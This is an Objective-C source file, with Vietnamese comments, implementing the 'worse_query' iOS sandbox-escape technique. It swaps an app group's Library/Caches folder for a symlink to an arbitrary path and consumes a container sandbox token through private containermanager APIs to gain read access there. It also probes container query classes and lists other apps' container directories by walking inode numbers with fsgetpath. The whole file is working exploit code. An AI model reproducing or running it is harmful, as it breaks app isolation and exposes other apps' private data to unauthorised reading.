//
//  BQCore.m
//  bbbbbb — lõi truy cập container, chỉ dùng kỹ thuật worse_query.
//
//  Kỹ thuật gốc: worse_query — Taj C (forcequitOS), GPL-3.0-or-later.
//  Bản cài đặt độc lập; xem NOTICES.md.
//

#import "BQCore.h"

#import <dirent.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <limits.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <sys/fsgetpath.h>
#import <sys/mount.h>
#import <sys/stat.h>
#import <sys/xattr.h>
#import <unistd.h>
#import <os/object.h>
#import <xpc/xpc.h>

// ---------------------------------------------------------------- symbols ---

typedef void *(*bq_create_fn)(void);
typedef void (*bq_set_class_fn)(void *, uint64_t);
typedef void (*bq_set_ids_fn)(void *, xpc_object_t);
typedef void (*bq_set_u64_fn)(void *, uint64_t);
typedef void *(*bq_get_single_fn)(void *);
typedef void (*bq_free_fn)(void *);
typedef void *(*bq_copy_token_fn)(void *);
typedef int64_t (*bq_consume_fn)(void *);
typedef int64_t (*bq_release_fn)(int64_t);
typedef bool (*bq_iterate_fn)(void *, bool (^)(void *));
typedef const char *(*bq_get_identifier_fn)(void *);

typedef struct {
    bq_create_fn create;
    bq_set_class_fn setClass;
    bq_set_ids_fn setGroupIds;
    bq_set_u64_fn setFlags;
    bq_set_u64_fn setPart;
    bq_get_single_fn getSingle;
    bq_free_fn freeQuery;
    bq_copy_token_fn copyToken;
    bq_consume_fn consume;
    bq_release_fn releaseToken;
    bq_iterate_fn iterate;
    bq_get_identifier_fn getIdentifier;
} BQSymbols;

static BQSymbols gSymbols;
static BOOL gSymbolsLoaded = NO;

static void BQLoadSymbols(void) {
    if (gSymbolsLoaded) return;
    gSymbolsLoaded = YES;

    void *manager = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!manager) return;

    gSymbols.create = (bq_create_fn)dlsym(manager, "container_query_create");
    gSymbols.setClass = (bq_set_class_fn)dlsym(manager, "container_query_set_class");
    gSymbols.setGroupIds = (bq_set_ids_fn)dlsym(manager, "container_query_set_group_identifiers");
    gSymbols.setFlags = (bq_set_u64_fn)dlsym(manager, "container_query_operation_set_flags");
    gSymbols.setPart = (bq_set_u64_fn)dlsym(manager, "container_query_operation_set_part");
    gSymbols.getSingle = (bq_get_single_fn)dlsym(manager, "container_query_get_single_result");
    gSymbols.freeQuery = (bq_free_fn)dlsym(manager, "container_query_free");
    gSymbols.copyToken = (bq_copy_token_fn)dlsym(manager, "container_copy_sandbox_token");
    gSymbols.consume = (bq_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    gSymbols.releaseToken = (bq_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    gSymbols.iterate = (bq_iterate_fn)dlsym(manager, "container_query_iterate_results_sync");
    gSymbols.getIdentifier = (bq_get_identifier_fn)dlsym(manager, "container_object_get_identifier");
}

static BOOL BQSymbolsReady(void) {
    BQLoadSymbols();
    return gSymbols.create && gSymbols.setClass && gSymbols.setGroupIds &&
           gSymbols.setFlags && gSymbols.setPart && gSymbols.getSingle &&
           gSymbols.freeQuery && gSymbols.copyToken && gSymbols.consume;
}

// ------------------------------------------------------------------ state ---

static NSString *gLastError = nil;
static NSMutableDictionary<NSString *, NSNumber *> *gGrantCache = nil;   // path → handle
static NSMutableDictionary<NSNumber *, NSString *> *gGrantPaths = nil;  // handle → path
static NSMutableArray<NSString *> *gGrantOrder = nil;                   // cũ nhất trước
static NSMutableDictionary<NSString *, NSNumber *> *gFailedPaths = nil;  // path → thời điểm
static NSRecursiveLock *gGrantLock = nil;

/// Số token sống tối đa (kernel giới hạn sandbox extension mỗi tiến trình).
static const NSUInteger kBQMaxLiveHandles = 160;
/// Thời gian nhớ đường dẫn vừa thất bại (để khỏi thử lại vô ích).
static const NSTimeInterval kBQFailedTTL = 600;

static void BQSetError(NSString *message) {
    gLastError = message;
    NSLog(@"[worse_query] %@", message);
}

// ---------------------------------------------------------------- helpers ---

/// Chuẩn hoá đường dẫn: `/var/...` → `/private/var/...` (đường dẫn thật trên
/// volume) và bỏ dấu / cuối.
static NSString *BQNormalizePath(NSString *path) {
    if (!path.length) return path;
    NSString *normalized = path.stringByStandardizingPath;
    if ([normalized hasPrefix:@"/var/"]) {
        normalized = [@"/private" stringByAppendingString:normalized];
    }
    while (normalized.length > 1 && [normalized hasSuffix:@"/"]) {
        normalized = [normalized substringToIndex:normalized.length - 1];
    }
    return normalized;
}

/// Token chỉ thất bại khi sandbox trả EPERM; EACCES là quyền file (container
/// của root) mà token không thay đổi được.
static BOOL BQPathOpens(NSString *path) {
    struct stat info;
    if (lstat(path.fileSystemRepresentation, &info) != 0) return NO;
    int fd = open(path.fileSystemRepresentation, O_RDONLY | O_NOFOLLOW | O_NONBLOCK | O_CLOEXEC);
    if (fd >= 0) {
        close(fd);
        return YES;
    }
    return errno != EPERM;
}

/// App-group entitlement của chính app (qua Security framework).
static NSArray<NSString *> *BQAppGroups(void) {
    void *security = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
    typedef CFTypeRef (*create_fn)(CFAllocatorRef);
    typedef CFTypeRef (*copy_value_fn)(CFTypeRef, CFStringRef, CFErrorRef *);
    create_fn create = (create_fn)dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
    copy_value_fn copyValue = (copy_value_fn)dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
    if (!create && security) create = (create_fn)dlsym(security, "SecTaskCreateFromSelf");
    if (!copyValue && security) copyValue = (copy_value_fn)dlsym(security, "SecTaskCopyValueForEntitlement");
    if (!create || !copyValue) return @[];

    CFTypeRef task = create(kCFAllocatorDefault);
    if (!task) return @[];
    CFTypeRef value = copyValue(task, CFSTR("com.apple.security.application-groups"), NULL);
    NSMutableArray<NSString *> *groups = [NSMutableArray array];
    if (value && CFGetTypeID(value) == CFArrayGetTypeID()) {
        CFArrayRef array = (CFArrayRef)value;
        for (CFIndex index = 0; index < CFArrayGetCount(array); index++) {
            CFTypeRef entry = CFArrayGetValueAtIndex(array, index);
            if (entry && CFGetTypeID(entry) == CFStringGetTypeID()) {
                [groups addObject:[(__bridge NSString *)entry copy]];
            }
        }
    }
    if (value) CFRelease(value);
    CFRelease(task);
    return groups;
}

/// iOS 26 dùng bộ cờ khác iOS 27 — thử bộ ứng với OS trước, bộ còn lại sau.
static uint64_t BQFlagsForOS(BOOL alternate) {
    NSInteger major = NSProcessInfo.processInfo.operatingSystemVersion.majorVersion;
    uint64_t standard = 0x8000000000ULL;
    uint64_t alternative = 0x0800000000ULL;
    if (major >= 27) return alternate ? alternative : standard;
    return alternate ? standard : alternative;
}

// ---------------------------------------------------------- swap helpers ---

/// Dời `path` sang `backup` rồi đặt symlink tới `target` tại `path`.
static BOOL BQSwapInSymlink(NSString *path, NSString *target, NSString *backup) {
    NSFileManager *files = [NSFileManager defaultManager];
    [files removeItemAtPath:backup error:nil];
    if ([files fileExistsAtPath:path]) {
        NSError *error = nil;
        if (![files moveItemAtPath:path toPath:backup error:&error]) {
            BQSetError([NSString stringWithFormat:@"không dời được %@: %@", path, error.localizedDescription]);
            return NO;
        }
    }
    unlink(path.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, path.fileSystemRepresentation) != 0) {
        BQSetError([NSString stringWithFormat:@"symlink %@ → %@ lỗi %d (%s)",
                    path, target, errno, strerror(errno)]);
        if ([files fileExistsAtPath:backup]) [files moveItemAtPath:backup toPath:path error:nil];
        return NO;
    }
    return YES;
}

/// Trả `path` về trạng thái ban đầu (bỏ symlink, đặt lại thư mục gốc).
static void BQRestorePath(NSString *path, NSString *backup) {
    NSFileManager *files = [NSFileManager defaultManager];
    if ([files fileExistsAtPath:backup]) {
        [files removeItemAtPath:path error:nil];
        [files moveItemAtPath:backup toPath:path error:nil];
        return;
    }
    struct stat info;
    if (lstat(path.fileSystemRepresentation, &info) == 0 && S_ISLNK(info.st_mode)) {
        unlink(path.fileSystemRepresentation);
    }
    if (![files fileExistsAtPath:path]) {
        [files createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
    }
}

// ------------------------------------------------------------ grant (wq) ---

/// Object xpc cho group id — tạo một lần rồi dùng lại (ARC không cho
/// release thủ công, nên giữ suốt tiến trình).
static xpc_object_t gGroupObject = NULL;
static char gGroupObjectID[512] = {0};

static xpc_object_t BQGroupObject(const char *groupID) {
    if (gGroupObject && strcmp(gGroupObjectID, groupID) == 0) {
        return gGroupObject;
    }
    gGroupObject = xpc_string_create(groupID);
    strncpy(gGroupObjectID, groupID, sizeof(gGroupObjectID) - 1);
    return gGroupObject;
}

/// Xin sandbox token cho class 7 (app group) với `groupID`.
static int64_t BQQueryClass7(NSString *groupID, uint64_t flags, NSString **outPath) {
    if (!BQSymbolsReady()) return -1;

    void *query = gSymbols.create();
    if (!query) return -2;

    gSymbols.setClass(query, 7);
    xpc_object_t identifier = BQGroupObject(groupID.UTF8String);
    gSymbols.setGroupIds(query, identifier);
    gSymbols.setPart(query, 3);   // Library/Caches
    gSymbols.setFlags(query, flags);

    void *result = gSymbols.getSingle(query);

    int64_t handle = -3;
    if (result) {
        void *token = gSymbols.copyToken(result);
        if (token) {
            handle = gSymbols.consume(token);
            free(token);
            if (handle < 0) {
                handle = -4;
            }
        } else {
            handle = -5;
        }
    }
    gSymbols.freeQuery(query);

    if (outPath) *outPath = nil;
    return handle;
}

/// worse_query: swap `Library/Caches` của app group thành symlink tới đích rồi
/// xin token class-7 cho đích đó.
static int64_t BQGrantClass7(NSString *target) {
    NSArray<NSString *> *groups = BQAppGroups();
    if (!groups.count) {
        BQSetError(@"thiếu App Group entitlement — kỹ thuật worse_query cần group");
        return -6;
    }

    NSFileManager *files = [NSFileManager defaultManager];
    for (NSString *groupID in groups) {
        NSURL *groupURL = [files containerURLForSecurityApplicationGroupIdentifier:groupID];
        NSString *groupRoot = groupURL.path;
        if (!groupRoot.length) continue;

        NSString *library = [groupRoot stringByAppendingPathComponent:@"Library"];
        NSString *caches = [library stringByAppendingPathComponent:@"Caches"];
        NSString *backup = [library stringByAppendingPathComponent:@"Caches.wq"];
        [files createDirectoryAtPath:library withIntermediateDirectories:YES attributes:nil error:nil];

        if (!BQSwapInSymlink(caches, target, backup)) {
            BQRestorePath(caches, backup);
            continue;
        }

        int64_t handle = -7;
        for (BOOL alternate = NO; alternate <= YES; alternate++) {
            uint64_t flags = BQFlagsForOS(alternate);
            int64_t candidate = BQQueryClass7(groupID, flags, NULL);
            if (candidate >= 0 && BQPathOpens(target)) {
                handle = candidate;
                break;
            }
            if (candidate >= 0 && gSymbols.releaseToken) {
                gSymbols.releaseToken(candidate);
            }
        }

        if (handle >= 0) {
            // Giữ symlink + token sống: đọc được cây thư mục tới khi token bị
            // thu hồi (hạn mức) hoặc app kết thúc.
            BQSetError(nil);
            return handle;
        }

        BQRestorePath(caches, backup);
    }
    BQSetError([NSString stringWithFormat:@"worse_query không cấp token cho %@", target]);
    return -8;
}

static void BQEvictOldestHandle(void) {
    if (!gGrantCache || !gGrantOrder || !gGrantOrder.count) return;
    NSString *oldest = gGrantOrder.firstObject;
    [gGrantOrder removeObjectAtIndex:0];
    NSNumber *handle = gGrantCache[oldest];
    if (handle && gSymbols.releaseToken) {
        gSymbols.releaseToken(handle.longLongValue);
    }
    [gGrantCache removeObjectForKey:oldest];
}

static void BQGrantLock(void) {
    if (!gGrantLock) gGrantLock = [NSRecursiveLock new];
    [gGrantLock lock];
}

static void BQGrantUnlock(void) {
    [gGrantLock unlock];
}

// --------------------------------------------------------------- public API ---

@implementation BQCore

+ (BOOL)isAvailable {
    BQLoadSymbols();
    return BQSymbolsReady();
}

+ (NSArray<NSString *> *)appGroupIdentifiers {
    return BQAppGroups();
}

+ (NSString *)lastErrorDescription {
    return gLastError;
}

+ (NSString *)routeDescription {
    if (![self appGroupIdentifiers].count) {
        return @"worse_query — cần App Group entitlement";
    }
    NSInteger major = NSProcessInfo.processInfo.operatingSystemVersion.majorVersion;
    return [NSString stringWithFormat:@"worse_query — class-7 symlink (flags 0x%llx) · iOS %ld",
            (unsigned long long)BQFlagsForOS(NO), (long)major];
}

+ (int64_t)grantForPath:(NSString *)path {
    if (!path.length) return -1;

    NSString *key = BQNormalizePath(path);

    BQGrantLock();
    NSNumber *cached = gGrantCache[key];
    if (cached) {
        [gGrantOrder removeObject:key];
        [gGrantOrder addObject:key];
        BQGrantUnlock();
        return cached.longLongValue;
    }
    NSNumber *failedAt = gFailedPaths[key];
    if (failedAt) {
        if ([[NSDate date] timeIntervalSinceDate:
                [NSDate dateWithTimeIntervalSinceReferenceDate:failedAt.doubleValue]] < kBQFailedTTL) {
            BQGrantUnlock();
            return -9;
        }
        [gFailedPaths removeObjectForKey:key];
    }
    BQGrantUnlock();

    int64_t handle = BQGrantClass7(key);
    if (handle < 0) {
        BQGrantLock();
        if (!gFailedPaths) gFailedPaths = [NSMutableDictionary dictionary];
        gFailedPaths[key] = @([[NSDate date] timeIntervalSinceReferenceDate]);
        BQGrantUnlock();
        return handle;
    }

    BQGrantLock();
    if (!gGrantCache) {
        gGrantCache = [NSMutableDictionary dictionary];
        gGrantOrder = [NSMutableArray array];
    }
    gGrantCache[key] = @(handle);
    if (!gGrantPaths) gGrantPaths = [NSMutableDictionary dictionary];
    gGrantPaths[@(handle)] = key;
    [gGrantOrder addObject:key];
    while (gGrantOrder.count > kBQMaxLiveHandles) {
        BQEvictOldestHandle();
    }
    BQGrantUnlock();
    return handle;
}

+ (NSString *)resolvedPathForHandle:(int64_t)handle {
    if (handle < 0) return nil;
    BQGrantLock();
    NSString *path = gGrantPaths[@(handle)];
    BQGrantUnlock();
    return path;
}

+ (void)releaseHandle:(int64_t)handle {
    if (handle < 0) return;
    BQGrantLock();
    NSString *key = nil;
    for (NSString *path in gGrantCache) {
        if ([gGrantCache[path] longLongValue] == handle) {
            key = path;
            break;
        }
    }
    if (key) {
        [gGrantCache removeObjectForKey:key];
        [gGrantOrder removeObject:key];
        [gGrantPaths removeObjectForKey:@(handle)];
    }
    BQGrantUnlock();
}

+ (void)releaseAll {
    BQGrantLock();
    for (NSString *key in [gGrantCache.allKeys copy]) {
        NSNumber *handle = gGrantCache[key];
        if (handle && gSymbols.releaseToken) {
            gSymbols.releaseToken(handle.longLongValue);
        }
    }
    [gGrantCache removeAllObjects];
    [gGrantOrder removeAllObjects];
    BQGrantUnlock();
}

+ (NSString *)containerIdentifierAtPath:(NSString *)path {
    if (!path.length) return nil;
    NSString *directory = BQNormalizePath(path);

    // 1) xattr: nhanh, không cần quyền đọc file.
    char buffer[512];
    ssize_t length = getxattr(directory.fileSystemRepresentation,
                              "com.apple.containermanager.identifier",
                              buffer, sizeof(buffer) - 1, 0, 0);
    if (length > 0) {
        buffer[length] = 0;
        return [NSString stringWithUTF8String:buffer];
    }

    // 2) metadata plist (thường root-only nên chỉ là chốt cuối).
    NSString *metadata = [directory stringByAppendingPathComponent:
                          @".com.apple.mobile_container_manager.metadata.plist"];
    NSData *data = [NSData dataWithContentsOfFile:metadata];
    if (data.length) {
        NSDictionary *plist = [NSPropertyListSerialization propertyListWithData:data
                                                                       options:0
                                                                        format:NULL
                                                                         error:nil];
        id identifier = [plist isKindOfClass:NSDictionary.class] ? plist[@"MCMMetadataIdentifier"] : nil;
        if ([identifier isKindOfClass:NSString.class] && [identifier length]) {
            return identifier;
        }
    }
    return nil;
}

// ------------------------------------------------------------------ probe ---

/// Đếm định danh mà một tổ hợp (class, part, flags) liệt kê được.
static NSUInteger BQProbeCount(uint64_t cls, uint64_t part, uint64_t flags) {
    if (!BQSymbolsReady()) return 0;
    void *query = gSymbols.create();
    if (!query) return 0;

    gSymbols.setClass(query, cls);
    gSymbols.setPart(query, part);
    gSymbols.setFlags(query, flags);

    __block NSUInteger count = 0;
    NSMutableSet<NSString *> *identifiers = [NSMutableSet set];
    if (gSymbols.getSingle) gSymbols.getSingle(query);
    if (gSymbols.iterate && gSymbols.getIdentifier) {
        gSymbols.iterate(query, ^bool(void *object) {
            const char *raw = object ? gSymbols.getIdentifier(object) : NULL;
            if (raw) {
                NSString *identifier = [NSString stringWithUTF8String:raw];
                if (identifier.length) [identifiers addObject:identifier];
            }
            return identifiers.count < 5000;
        });
    }
    count = identifiers.count;
    gSymbols.freeQuery(query);
    return count;
}

+ (NSArray<NSString *> *)probeQueries {
    NSMutableArray<NSString *> *lines = [NSMutableArray array];
    const uint64_t classes[] = { 0, 1, 2, 5, 7, 8, 10, 11, 12, 13, 15 };
    const uint64_t parts[] = { 0, 3 };
    const uint64_t flags[] = { 0x8000000000ULL, 0x0800000000ULL, 0x100000000ULL, 0 };

    for (size_t c = 0; c < sizeof(classes) / sizeof(classes[0]); c++) {
        for (size_t p = 0; p < sizeof(parts) / sizeof(parts[0]); p++) {
            for (size_t f = 0; f < sizeof(flags) / sizeof(flags[0]); f++) {
                NSUInteger count = BQProbeCount(classes[c], parts[p], flags[f]);
                NSString *line = [NSString stringWithFormat:
                                  @"class %llu · part %llu · flags 0x%llx → %lu",
                                  (unsigned long long)classes[c], (unsigned long long)parts[p],
                                  (unsigned long long)flags[f], (unsigned long)count];
                [lines addObject:line];
                if (count > 0) NSLog(@"[probe] %@", line);
            }
        }
    }
    return lines;
}

// ------------------------------------------------------- fsgetpath listing ---

+ (NSArray<NSString *> *)listDirectoryEntries:(NSString *)path maxInode:(uint64_t)maxInode {
    return [self listDirectoryEntries:path fromInode:1 maxInode:maxInode scannedUpTo:NULL];
}

/// Dò số inode của volume rồi dựng lại đường dẫn (fsgetpath) — dùng khi
/// không được phép `readdir` trong container của app khác.
+ (NSArray<NSString *> *)listDirectoryEntries:(NSString *)path
                                    fromInode:(uint64_t)startInode
                                     maxInode:(uint64_t)maxInode
                                  scannedUpTo:(uint64_t *)scannedUpTo {
    if (!path.length || maxInode < 1) return @[];

    NSString *directory = BQNormalizePath(path);
    struct statfs stats;
    if (statfs(directory.fileSystemRepresentation, &stats) != 0) return @[];

    char prefix[PATH_MAX];
    if (![directory getFileSystemRepresentation:prefix maxLength:sizeof(prefix)]) return @[];
    size_t prefixLength = strlen(prefix);
    if (prefixLength == 1) prefixLength = 0;

    NSMutableArray<NSString *> *result = [NSMutableArray array];
    char buffer[PATH_MAX];
    uint64_t start = startInode > 0 ? startInode : 1;
    for (uint64_t inode = start; inode <= maxInode; inode++) {
        ssize_t length = fsgetpath(buffer, sizeof(buffer), &stats.f_fsid, inode);
        if (length <= 0) continue;
        if (strncmp(buffer, prefix, prefixLength) != 0) continue;
        if (buffer[prefixLength] != '/') continue;
        if (strchr(buffer + prefixLength + 1, '/')) continue;
        NSString *entry = [NSString stringWithUTF8String:buffer];
        if (entry) [result addObject:entry];
    }
    if (scannedUpTo) *scannedUpTo = maxInode;
    return result;
}

@end
